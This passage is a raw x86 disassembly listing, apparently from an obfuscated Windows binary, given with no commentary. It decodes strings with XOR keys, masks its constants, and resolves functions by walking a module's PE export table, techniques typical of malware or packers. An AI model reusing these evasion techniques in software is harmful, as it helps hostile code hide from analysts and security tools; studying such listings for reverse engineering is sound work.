  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
